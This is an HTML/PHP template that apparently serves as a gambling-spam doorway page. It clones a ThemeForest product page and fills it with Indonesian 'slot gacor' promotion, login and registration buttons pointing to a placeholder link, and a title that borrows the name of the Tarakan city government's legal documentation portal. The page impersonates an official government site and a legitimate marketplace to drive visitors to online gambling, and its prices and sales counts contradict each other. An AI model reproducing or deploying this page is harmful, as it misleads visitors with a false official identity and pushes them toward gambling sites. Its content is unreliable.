													<a class="header-site-titles__link t-link elements-nav__main-link" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_9678002&amp;utm_medium=referral&amp;utm_source=themeforest.net" target="_blank">
														<span>
															ABOUT
														</span>
													</a>

													<a target="_blank" class="elements-nav__dropdown-container unique-selling-points__variant" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionName&quot;:&quot;elements_mkt-switcher_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="https://elements.envato.com/?utm_campaign=elements_mkt-switcher_31JUL2024&amp;utm_content=tf_item_9678002&amp;utm_medium=referral&amp;utm_source=themeforest.net">
														<div class="elements-nav__main-panel" bis_skin_checked="1">
															<img class="elements-nav__logo-container" loading="lazy" src="https://public-assets.envato-static.com/assets/header/EnvatoElements-logo-4f70ffb865370a5fb978e9a1fc5bbedeeecdfceb8d0ebec2186aef4bee5db79d.svg" alt="Elements logo" height="23" width="101">

															<div class="elements-nav__punch-line" bis_skin_checked="1">
																<h2>
																	Looking for unlimited downloads?
																</h2>
																<p>
																	Subscribe to Envato Elements.
																</p>
																<ul>
																	<li>
																		<img src="https://public-assets.envato-static.com/assets/header/badge-a65149663b95bcee411e80ccf4da9788f174155587980d8f1d9c44fd8b59edd8.svg" alt="badge" width="20" height="20">
																		Millions of premium assets
																	</li>
																	<li>
																		<img src="https://public-assets.envato-static.com/assets/header/thumbs_up-e5ce4c821cfd6a6aeba61127a8e8c4d2d7c566e654f588a22708c64d66680869.svg" alt="thumbs up" width="20" height="20">
																		Great value subscription
																	</li>
																</ul>
																<button class="brand-neue-button brand-neue-button__open-in-new elements-nav__cta">Let's
																	create</button>
																<p></p>
															</div>
														</div>
														<div class="elements-nav__secondary-panel" bis_skin_checked="1">
															<img class="elements-nav__secondary-panel__collage" loading="lazy" src="https://public-assets.envato-static.com/assets/header/items-collage-1x-a39e4a5834e75c32a634cc7311720baa491687b1aaa4b709ebd1acf0f8427b53.png" srcset="https://public-assets.envato-static.com/assets/header/items-collage-2x-75e1ad16a46b9788861780a57feeb5fd1ad1026ecce9396702f0ef8f6f542697.png 2x" alt="Collage of Elements items" width="267" height="233">
														</div>
													</a>
												</div>

												<div class="header-site-floating-logo__container" bis_skin_checked="1">
													<div class="" bis_skin_checked="1">
														<img src="https://www.xnxx.com/favicon-16x16.png" alt="SITUS SLOT GACOR" style="max-width: 50px; height: auto; object-fit: contain;" data-spm-anchor-id="0.0.header.i0.27e27142EyRkBl">
													</div>
												</div>
											</nav>
										</div>
									</div>

								</div>

								<div class="site-header__categories is-hidden-tablet-and-below" bis_skin_checked="1">
									<div class="header-categories" bis_skin_checked="1">
										<div class="grid-container -layout-wide" bis_skin_checked="1">
											<ul class="header-categories__links">
												<li class="header-categories__links-item">
													<a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-0-dropdown" href="<?php echo $urlPath;?>">SLOT GACOR</a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-1-dropdown" href="<?php echo $urlPath;?>"><?php echo $BRANDS;?></a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-2-dropdown" href="<?php echo $urlPath;?>">SLOT ONLINE</a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link header-categories__main-link--empty" href="<?php echo $urlPath;?>">SITUS JUDI SLOT ONLINE</a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-4-dropdown" href="<?php echo $urlPath;?>">JUDI SLOT</a>
													</a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link" data-view="touchOnlyDropdown" data-dropdown-target=".js-categories-5-dropdown" href="<?php echo $urlPath;?>">SLOT GACOR MAXWIN</a>
												</li>
												<li class="header-categories__links-item">
													<a class="header-categories__main-link header-categories__main-link--empty" href="<?php echo $urlPath;?>">LINK SLOT GACOR HARI INI</a>
												</li>
											</ul>
												<div class="header-categories__search" bis_skin_checked="1">
													<form id="search" data-view="searchField" action="<?php echo $urlPath;?>" accept-charset="UTF-8" method="get">
														<div class="search-field -border-light h-ml2" bis_skin_checked="1">
															<div class="search-field__input" bis_skin_checked="1">
																<input id="term" name="term" class="js-term search-field__input-field" type="search" placeholder="CARI PRODUK SITUS SLOT GACOR">
															</div>
															<button class="search-field__button" type="submit">
																<i class="e-icon -icon-search"><span class="e-icon__alt">CARI PRODUK SITUS SLOT GACOR</span></i>
															</button>
														</div>
													</form>
												</div>
											
										</div>
									</div>

								</div>
								
							</header>
						</div>

						<div class="js-canvas__body canvas__body" bis_skin_checked="1">
							<div class="grid-container" bis_skin_checked="1">
							</div>



							<div class="context-header " bis_skin_checked="1">
								<div class="grid-container " bis_skin_checked="1">
									<nav class="breadcrumbs h-text-truncate  ">
									  <a class="js-breadcrumb-category"
											href="<?php echo $urlPath;?>">SLOT ONLINE</a>


										<a href="<?php echo $urlPath;?>"
											class="js-breadcrumb-category">SLOT GACOR</a>

										<a class="js-breadcrumb-category"
											><?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan</a>
									</nav>

									<div class="item-header" data-view="itemHeader" bis_skin_checked="1">
										<div class="item-header__top" bis_skin_checked="1">
											<div class="item-header__title" bis_skin_checked="1">
												<h1 class="t-heading -color-inherit -size-l h-m0 is-hidden-phone"><?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan</h1>

												<h1 class="t-heading -color-inherit -size-xs h-m0 is-hidden-tablet-and-above">
													<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan
												</h1>
											</div>

											<div class="item-header__price is-hidden-desktop" bis_skin_checked="1">
												<a class="js-item-header__cart-button e-btn--3d -color-primary -size-m" rel="nofollow" title="Add to Cart" data-view="modalAjax" href="<?php echo $urlPath;?>">
													<span class="item-header__cart-button-icon">
														<i class="e-icon -icon-cart -margin-right"></i>
													</span>

													<span class="t-heading -size-m -color-light -margin-none">
														<b class="t-currency"><span class="js-item-header__price">$33</span></b>
													</span>
												</a>
											</div>
										</div>

										<div class="item-header__details-section" bis_skin_checked="1">
											<div class="item-header__author-details" bis_skin_checked="1">
												Seller By <a rel="author" class="js-by-author" href="<?php echo $urlPath;?>">SLOT GACOR HARI INI</a>
											</div>
											<div class="item-header__sales-count" bis_skin_checked="1">
												<svg width="16px" height="16px" viewBox="0 0 16 16" class="item-header__sales-count-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
													<title>Cart</title>
													<path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 187.66 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.967 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
													</path>

												</svg>

												<strong>99.548</strong> sales
											</div>
											<div class="item-header__envato-highlighted" bis_skin_checked="1">
												<strong><?php echo $BRANDS;?></strong>
												<svg width="16px" height="16px" viewBox="0 0 14 14" class="item-header__envato-checkmark-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
													<title></title>
													<path fill-rule="evenodd" clip-rule="evenodd" d="M0.333252 7.00004C0.333252 3.31814 3.31802 0.333374 6.99992 0.333374C8.76803 0.333374 10.4637 1.03575 11.714 2.286C12.9642 3.53624 13.6666 87.66193 13.6666 7.00004C13.6666 10.6819 10.6818 13.6667 6.99992 13.6667C3.31802 13.6667 0.333252 10.6819 0.333252 7.00004ZM6.15326 9.23337L9.89993 5.48671C10.0227 5.35794 10.0227 5.15547 9.89993 5.02671L9.54659 4.67337C9.41698 4.54633 9.20954 4.54633 9.07993 4.67337L5.91993 7.83337L4.91993 6.84004C4.85944 6.77559 4.77498 6.73903 4.68659 6.73903C4.5982 6.73903 4.51375 6.77559 4.45326 6.84004L4.09993 7.19337C4.03682 7.25596 4.00133 7.34116 4.00133 7.43004C4.00133 7.51892 4.03682 7.60412 4.09993 7.66671L5.68659 9.23337C5.74708 9.29782 5.83154 9.33439 5.91993 9.33439C6.00832 9.33439 6.09277 9.29782 6.15326 9.23337Z" fill="#79B530"></path>

												</svg>
											   
											</div>
										</div>


									</div>



									<!-- Desktop Item Navigation -->
									<div class="is-hidden-tablet-and-below page-tabs" bis_skin_checked="1">
										<ul>
											<li class="selected"><a class="js-item-navigation-item-details t-link -decoration-none" href="<?php echo $urlPath;?>">Item Details</a>
											</li>
											<li><a class="js-item-navigation-reviews t-link -decoration-none" href="<?php echo $urlPath;?>"><span>Reviews</span><span>
														<div class="rating-detailed-small" bis_skin_checked="1">
															<div class="rating-detailed-small__header" bis_skin_checked="1">
																<div class="rating-detailed-small__stars" bis_skin_checked="1">
																	<div class="rating-detailed-small-center__star-rating" bis_skin_checked="1">
																		<i class="e-icon -icon-star">
																		</i> <i class="e-icon -icon-star">
																		</i> <i class="e-icon -icon-star">
																		</i> <i class="e-icon -icon-star">
																		</i> <i class="e-icon -icon-star">
																		</i>
																	</div>
																	5.00
																	<span class="is-visually-hidden">5.00 stars</span>
																</div>
															</div>
														</div>
													</span><span class="item-navigation-reviews-comments">967</span></a></li>
											<li><a class="js-item-navigation-comments t-link -decoration-none" href="<?php echo $urlPath;?>"><span>Comments</span><span class="item-navigation-reviews-comments">99.548</span></a></li>
											<li><a class="js-item-navigation-support t-link -decoration-none" href="<?php echo $urlPath;?>">Support</a>
											</li>
										</ul>


									</div>
		<style>.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr);font-weight:700}.n-columns-2 a{text-align:center}.login,.register{color:#fff;padding:13px 10px}.login,.login-button{text-shadow:2px 2px #0c0f12;border-radius:10px 10px;border:2px solid #FFFFFF;background:linear-gradient(to bottom,#00ffc9 0,#0000ff 100%);color:#fff}.register,.register-button{text-shadow:2px 2px #000;border-radius:10px 10px;background:linear-gradient(to bottom,#00ffc9 0,#0000ff 100%);border:2px solid #FFFFFF}</style>
		<!-- Section 2 -->
		  </div>
		</div>


									<!-- Tablet or below Item Navigation -->
									<div class="page-tabs--dropdown" data-view="replaceItemNavsWithRemote" data-target=".js-remote" bis_skin_checked="1">
										<div class="page-tabs--dropdown__slt-custom-wlabel" bis_skin_checked="1">
											<div class="slt-custom-wlabel--page-tabs--dropdown" bis_skin_checked="1">
												<label>
													<span class="js-label">
														Item Details
													</span>
													<span class="slt-custom-wlabel__arrow">
														<i class="e-icon -icon-arrow-fill-down"></i>
													</span>
												</label>

												<select class="js-remote">
													<option selected="selected" data-url="/item/marketica-marketplace-wordpress-theme/9678002">Item
														Details</option>
													<option data-url="/item/marketica-marketplace-wordpress-theme/reviews/9678002">
														Reviews (75)</option>
													<option data-url="/item/marketica-marketplace-wordpress-theme/9678002/comments">
														Comments (802)</option>
													<option data-url="/item/marketica-marketplace-wordpress-theme/9678002/support">
														Support</option>


												</select>
											</div>
										</div>
									</div>

									<div class="page-tabs" bis_skin_checked="1">
										<ul class="right item-bookmarking__left-icons_hidden" data-view="bookmarkStatesLoader">
											<li class="js-favorite-widget item-bookmarking__control_icons--favorite" data-item-id="9678002"><a data-view="modalAjax" class="t-link -decoration-none" href="<?php echo $urlPath;?>"><span class="item-bookmarking__control--label">Add to Favorites</span></a>
											</li>
											<li class="js-collection-widget item-bookmarking__control_icons--collection" data-item-id="9678002"><a data-view="modalAjax" class="t-link -decoration-none" href="<?php echo $urlPath;?>"><span class="item-bookmarking__control--label">Add to Collection</span></a>
											</li>
										</ul>
									</div>


								</div>
							</div>


							<div class="content-main" id="content" bis_skin_checked="1">

								<div class="grid-container" bis_skin_checked="1">
									<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		window.GtmMeasurements.sendAnalyticsEvent({"eventName":"view_item","eventType":"user","ecommerce":{"currency":"USD","value":37.0,"items":[{"affiliation":"themeforest","item_id":9678002,"item_name":"<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan","item_brand":"tokopress","item_category":"wordpress","item_category2":"ecommerce","item_category3":"woocommerce","price":37.0,"quantity":1,"item_add_on":"bundle_6month","item_variant":"regular"}]}});
		//]]></script>


									<div bis_skin_checked="1">
										<link href="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg">

										<div class="content-s " bis_skin_checked="1">
											<div class="item-bookmarking__left-icons__wrapper" bis_skin_checked="1">
												<ul class="item-bookmarking__left-icons" data-view="bookmarkStatesLoader">
													<li class="item-bookmarking__control_icons--favorite">
														<span>
															<a title="Add to Favorites" data-view="modalAjax" href="<?php echo $urlPath;?>"><span class="item-bookmarking__control--label">Add to
																	Favorites</span></a>
														</span>

													</li>
													<li class="item-bookmarking__control_icons--collection">
														<span>
															<a title="Add to Collection" data-view="modalAjax" href="<?php echo $urlPath;?>">
																<span class="item-bookmarking__control--label">Add to
																	Collection</span>
															</a> </span>

													</li>
												</ul>
											</div>


											<div class="box--no-padding" bis_skin_checked="1">
												<div class="item-preview live-preview-btn--blue -preview-live" bis_skin_checked="1">



													<a target="_blank" href="<?php echo $ampmek;?>"><img alt="<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan" width="300" height="300" srcset="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg" sizes="(min-width: 1024px) 590px, (min-width: 1px) 100vw, 600px" src="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg"></a>

													<div class="item-preview__actions" bis_skin_checked="1">
														<div class="n-columns-2">
															<a href="<?php echo $ampmek;?>" rel="nofollow noreferrer" class="login">LOGIN</a>
															<a href="<?php echo $ampmek;?>" rel="nofollow noreferrer" class="register">DAFTAR</a>
														</div>
													</div>
													</div>

												</div>
											</div>


											<div data-view="toggleItemDescription" bis_skin_checked="1">
												<div class="js-item-togglable-content has-toggle" bis_skin_checked="1">

													<div class="js-item-description-toggle item-description-toggle" bis_skin_checked="1">
														<a class="item-description-toggle__link" href="<?php echo $urlPath;?>">
															<span>Show More <i class="e-icon -icon-chevron-down"></i></span>
															<span class="item-description-toggle__less">Show Less <i class="e-icon -icon-chevron-down -rotate-180"></i></span>
														</a>
													</div>
												</div>
											</div>

											<section data-view="recommendedItems" data-url="/item/marketica-marketplace-wordpress-theme/9678002/recommended_items" id="recommended_items">
												<div class="author-recommended-collection" bis_skin_checked="1">

													<ul class="author-recommended-collection__list" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_item_list&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;item_list_name&quot;:&quot;Author Recommended tokopress&quot;,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26116208,&quot;item_name&quot;:&quot;Retrave | Travel \u0026 Tour Agency Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;travel-accomodation&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:1},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26126773,&quot;item_name&quot;:&quot;Coursly | Education \u0026 Offline Course Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;education&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:2},{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:26416085,&quot;item_name&quot;:&quot;Sweeding | Wedding Event Invitation Elementor Template Kit&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;template-kits&quot;,&quot;item_category2&quot;:&quot;elementor&quot;,&quot;item_category3&quot;:&quot;weddings&quot;,&quot;price&quot;:&quot;24&quot;,&quot;quantity&quot;:1,&quot;index&quot;:3}]},&quot;item_list_id&quot;:8435762}">




													</ul>
												</div>
												<div bis_skin_checked="1">

												</div>
											</section>






											<div data-view="itemPageScrollEvents" bis_skin_checked="1"></div>
										</div>

										<div class="sidebar-l sidebar-right" bis_skin_checked="1">


											<div class="pricebox-container" bis_skin_checked="1">
												<div class="purchase-panel" bis_skin_checked="1">
													<div id="purchase-form" class="purchase-form" bis_skin_checked="1">
														<form data-view="purchaseForm" data-analytics-has-custom-click="true" data-analytics-click-payload="{&quot;eventName&quot;:&quot;add_to_cart&quot;,&quot;eventType&quot;:&quot;user&quot;,&quot;quantityUpdate&quot;:false,&quot;ecommerce&quot;:{&quot;currency&quot;:&quot;USD&quot;,&quot;value&quot;:37.0,&quot;items&quot;:[{&quot;affiliation&quot;:&quot;themeforest&quot;,&quot;item_id&quot;:9678002,&quot;item_name&quot;:&quot;<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan&quot;,&quot;item_brand&quot;:&quot;tokopress&quot;,&quot;item_category&quot;:&quot;wordpress&quot;,&quot;item_category2&quot;:&quot;ecommerce&quot;,&quot;item_category3&quot;:&quot;woocommerce&quot;,&quot;price&quot;:&quot;37&quot;,&quot;quantity&quot;:1}]}}" action="<?php echo $urlPath;?>" accept-charset="UTF-8" method="post">
															<input type="hidden" name="authenticity_token" value="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ" autocomplete="off">
															<div bis_skin_checked="1">
																<div data-view="itemVariantSelector" data-id="9678002" data-cookiebot-enabled="true" bis_skin_checked="1">
																	<div class="purchase-form__selection" bis_skin_checked="1">
																		<span class="purchase-form__license-type">
																			<span data-view="flyout" class="flyout">
																				<span class="js-license-selector__chosen-license purchase-form__license-dropdown">Regular
																					License</span>
																				<div class="js-flyout__body flyout__body -padding-side-removed" bis_skin_checked="1">
																					<span class="js-flyout__triangle flyout__triangle"></span>
																					<div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
																						<div class="js-license-selector__item license-selector__item" data-license="regular" data-name="Regular License" bis_skin_checked="1">

																							<div class="license-selector__license-type" bis_skin_checked="1">
																								<span class="t-heading -size-xxs">Regular
																									License</span>
																								<span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
																							</div>
																							<div class="license-selector__price" bis_skin_checked="1">
																								<span class="t-heading -size-m h-m0">
																									<b class="t-currency"><span class="">$33</span></b>
																								</span>
																							</div>
																							<div class="license-selector__description" bis_skin_checked="1">
																								<p class="t-body -size-m h-m0">
																									Use, by you or one client,
																									in a single end product
																									which end users <strong>are
																										not</strong> charged
																									for. The total price
																									includes the item price and
																									a buyer fee.</p>
																							</div>
																						</div>
																					</div>
																					<div class="flyout__link" bis_skin_checked="1">
																						<p class="t-body -size-m h-m0">
																							<a class="t-link -decoration-reversed" target="_blank" href="<?php echo $urlPath;?>/licenses/standard">View
																								license details</a>
																						</p>
																					</div>
																				</div>
																			</span>


																			<input type="hidden" name="license" id="license" value="regular" class="js-purchase-default-license" data-license="regular" autocomplete="off">
																		</span>

																		<div class="js-purchase-heading purchase-form__price t-heading -size-xxl" bis_skin_checked="1">
																			<b class="t-currency"><span class="js-purchase-price">$86.957</span></b>
																		</div>
																	</div>


																	<div class="purchase-form__license js-purchase-license is-active" data-license="regular" bis_skin_checked="1">
																		<price class="js-purchase-license-prices" data-price-prepaid="$37" data-license="regular" data-price-prepaid-upgrade="$46.38" data-support-upgrade-price="$9.38" data-support-upgrade-saving="$12" data-support-extension-price="$15.63" data-support-extension-saving="$6.25" data-support-renewal-price="$10.00">
																		</price>
																	</div>

																	<div class="purchase-form__support" bis_skin_checked="1">
																		<ul class="t-icon-list -font-size-s -icon-size-s -offset-flush">
																			<li class="t-icon-list__item -icon-ok">
																				<span class="is-visually-hidden">Included:</span>
																				<?php echo $BRANDS;?>
																			</li>
																			<li class="t-icon-list__item -icon-ok">
																				<span class="is-visually-hidden">Included:</span>
																				<?php echo $BRANDS;?>
																			</li>
																			<li class="t-icon-list__item -icon-ok">
																				<span class="is-visually-hidden">Included:</span>
																				SLOT GACOR<span class="purchase-form__author-name"></span>
																				<a class="t-link -decoration-reversed js-support__inclusion-link" data-view="modalAjax" href="/item_support/what_is_item_support/9678002">
																					<svg width="12px" height="13px" viewBox="0 0 12 13" class="" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
																						<title>More Info</title>
																						<path fill-rule="evenodd" clip-rule="evenodd" d="M0 6.5a6 6 0 1 0 12 0 6 6 0 0 0-12 0zm7.739-3.17a.849.849 0 0 1-.307.664.949.949 0 0 1-.716.273c-.273 0-.529-.102-.716-.272a.906.906 0 0 1-.307-.665c0-.256.102-.512.307-.682.187-.17.443-.273.716-.273.273 0 .528.102.716.273a.908.908 0 0 1 .307.682zm-.103 6.34-.119.46c-.34.137-.613.24-.818.307a2.5 2.5 0 0 1-.716.103c-.409 0-.733-.103-.954-.307a.953.953 0 0 1-.341-.767c0-.12 0-.256.017-.375.017-.12.05-.273.085-.426l.426-1.517a7.14 7.14 0 0 1 .103-.41c.017-.119.034-.238.034-.357a.582.582 0 0 0-.12-.41c-.085-.068-.238-.119-.46-.119-.12 0-.239.017-.34.051-.069.03-.132.047-.189.064-.042.012-.082.024-.119.038l.12-.46c.234-.102.468-.18.69-.253l.11-.037c.24-.085.478-.119.734-.119.409 0 .733.102.954.307.222.187.341.477.341.784 0 .068 0 .187-.017.34v.003a2.173 2.173 0 0 1-.085.458l-.427 1.534-.102.41v.002c-.017.119-.034.237-.034.356 0 .204.051.34.136.409.137.085.307.119.46.102a1.3 1.3 0 0 0 .359-.051c.085-.051.17-.085.272-.12z" fill="#0084B4"></path>

																					</svg>

																				</a>
																			</li>
																		</ul>

																		<div class="purchase-form__upgrade purchase-form__upgrade--before-after-price" bis_skin_checked="1">
																			<div class="purchase-form__upgrade-checkbox purchase-form__upgrade-checkbox--before-after-price" bis_skin_checked="1">
																				<input type="hidden" name="support" id="support_default" value="bundle_6month" class="js-support__default" autocomplete="off">
																				<input type="checkbox" name="support" id="support" value="bundle_12month" class="js-support__option">
																			</div>
																			<div class="purchase-form__upgrade-info" bis_skin_checked="1">
																				<label class="purchase-form__label purchase-form__label--before-after-price" for="support">
																					Slot88 Situs Slot Gacor 777 100%
																					<span class="purchase-form__price purchase-form__price--before-after-price t-heading -size-xs h-pull-right">
																						<span class="js-renewal__price t-currency purchase-form__renewal-price purchase-form__renewal-price--strikethrough">$99.87</span>

																						<b class="t-currency">
																							<span class="js-support__price">$87.66</span>
																						</b>
																					</span>
																				</label>
																			</div>
																		</div>
																	</div>
																</div>
																<p class="t-body -size-m"><i><?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.</i>
																</p>
																<div class="purchase-form__us-dollars-notice-container" bis_skin_checked="1">
																	<p class="purchase-form__us-dollars-notice"><i>Price is in
																			US dollars and excludes tax and handling fees</i>
																	</p>

																</div>
															</div>
														</form>
													</div>

												</div>

											</div>











											<div class="t-body -size-s h-text-align-center h-mt2" bis_skin_checked="1">
												 All Rights Reserved Situs Slot Gacor 2025 Terpercaya
												<br>
												<a href="<?php echo $urlPath;?>">Contact the SITUS SLOT GACOR HARI INI Help Team</a>
											</div>

										</div>

										<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		window.addEventListener('unload',function(e){window.scrollTo(0,0);});
		//]]></script>
									</div>

								</div>
				   


					<div class="page__overlay" data-view="offCanvasNavToggle" data-off-canvas="close" bis_skin_checked="1">
					</div>



			<div data-site="themeforest" data-view="CsatSurvey" data-cookiebot-enabled="true" class="is-visually-hidden" bis_skin_checked="1">
				<div id="js-customer-satisfaction-survey" bis_skin_checked="1">
					<div class="e-modal" bis_skin_checked="1">
						<div class="e-modal__section" id="js-customer-satisfaction-survey-iframe-wrapper" bis_skin_checked="1">
						</div>
					</div>
				</div>
			</div>



			<div id="affiliate-tracker" class="is-hidden" data-view="affiliatesTracker" data-cookiebot-enabled="true" bis_skin_checked="1"></div>


			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		$(function(){viewloader.execute(Views);});
		//]]></script>


			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		trimGacUaCookies()
		trimGaSessionCookies()
		function trimGacUaCookies(){let maxCookies=15
		var gacCookies=[]
		let cookies=document.cookie.split('; ')
		for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
		if(cookieName.startsWith('_gac_UA')){gacCookies.push([cookieName,cookieVal])}}if(gacCookies.length<=maxCookies){return}gacCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
		for(let i in gacCookies){if(i<maxCookies)continue
		$.removeCookie(gacCookies[i][0],{path:'/',domain:'.'+window.location.host})}}function trimGaSessionCookies(){let maxCookies=15
		var gaCookies=[]
		const KEEPLIST=['_ga_ZKBVC1X78F','_ga_9Z72VQCKY0']
		let cookies=document.cookie.split('; ')
		for(let i in cookies){let[cookieName,cookieVal]=cookies[i].split('=',2)
		if(cookieName.startsWith('_ga_')){if(KEEPLIST.includes(cookieName)){continue}gaCookies.push([cookieName,cookieVal])}}if(gaCookies.length<=maxCookies){return}gaCookies.sort((a,b)=>{return(a[1]>b[1]?-1:1)})
		for(let i in gaCookies){if(i<maxCookies)continue
		$.removeCookie(gaCookies[i][0],{path:'/',domain:'.'+window.location.host})}}
		//]]></script>


			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		(function(){if(typeof window.datadog_attributes!='object')window.datadog_attributes={}
		window.datadog_attributes['pageType']='item:details'})()
		//]]></script>

		<style>
			.daftarku-fixed-footer {
					display: flex;
					justify-content: space-around;
					position: fixed;
					background: linear-gradient(to bottom, rgb(0, 0, 0) 0%, rgb(26, 26, 26) 50%, rgb(0, 0, 0) 100%);
					box-shadow: inset 2px 2px 2px 0px rgba(49, 49, 49, 0.5), 7px 7px 20px 0px rgba(0, 0, 0, 0.1), 4px 4px 5px 0px rgba(0, 0, 0, 0.1);
					outline: none;
					padding: 5px 0;
					box-shadow: 0 0 2px 2px rgb(165 88 88);
					left: 0;
					right: 0;
					bottom: 0;
					z-index: 99;
					border-radius: 40px 40px 0px 0px;
					border-style:dashed;
					
				}

				.daftarku-fixed-footer a {
					flex-basis: calc((100% - 15px*6)/ 5);
					text-decoration: none;
					display: flex;
					flex-direction: column;
					justify-content: center;
					align-items: center;
					color: #fcfbfb;
					max-width: 75px;
					font-size: 12px;
					font-family: Ubuntu, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
				}

				.daftarku-fixed-footer a:hover {
					font-weight: bold;
				}

				.daftarku-fixed-footer .center {
					transform: scale(1.5) translateY(-5px);
					background: center no-repeat;
					background-size: contain;
					background-color: inherit;
					border-radius: 50%;
				}

				.daftarku-fixed-footer img {
					max-width: 20px;
					margin-bottom: 0;
					max-height: 20px;
				}
		</style>
			


